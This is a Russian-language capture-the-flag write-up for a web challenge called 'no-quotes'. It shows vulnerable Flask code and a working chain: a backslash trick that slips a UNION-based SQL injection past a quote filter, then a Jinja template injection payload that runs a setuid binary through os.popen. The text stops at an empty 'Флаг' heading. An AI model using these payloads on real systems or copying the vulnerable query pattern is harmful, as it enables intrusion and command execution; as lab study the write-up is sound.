# UOFCTF — no-quotes (Web) Writeup (RU)

## Уязвимости

### SQLi в `/login`
```py
query = (
    "SELECT id, username FROM users "
    f"WHERE username = ('{username}') AND password = ('{password}')"
)
cur.execute(query)
```
Фильтр запрещает только кавычки:
```py
blacklist = ["'", '"']
```

### SSTI в `/home`
`username` из результата SQL кладётся в сессию и затем попадает в Jinja2:
```py
return render_template_string(open("templates/home.html").read() % session["user"])
```

### Вывод флага
`/readflag` — setuid-root бинарь, печатает `/root/flag.txt`.

---

## Обход “no quotes” через `\`

В MySQL/MariaDB `\` экранирует следующий символ. Если отправить `username=\`, приложение соберёт фрагмент `('\\')`.
Последовательность `\'` интерпретируется как **кавычка внутри строки**, поэтому “закрывающая кавычка” после `username`
не закрывает строку, и граница строки “уезжает” до следующей кавычки (перед `password`). Это позволяет протащить SQL payload
через поле пароля.

---

## Эксплуатация

Цель: через SQLi вернуть `username` равным Jinja-пейлоаду, чтобы он выполнился на `/home` и запустил `/readflag`.

### 1) SSTI payload
Jinja:
```jinja2
{{cycler.__init__.__globals__.os.popen('/readflag').read()}}
```

В SQL без кавычек — hex literal:
```text
0x7b7b6379636c65722e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e6f732e706f70656e28272f72656164666c616727292e7265616428297d7d
```

### 2) SQLi через `/login` (UNION на 2 колонки)
Оригинальный SELECT возвращает 2 колонки: `id, username`, значит надо юзать `UNION SELECT 1,<username>`.

**POST `/login`**
- `username`:
```text
\
```
- `password`:
```text
) UNION SELECT 1,0x7b7b6379636c65722e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e6f732e706f70656e28272f72656164666c616727292e7265616428297d7d#
```

`#` комментирует остаток исходного SQL.

### 3) Флаг

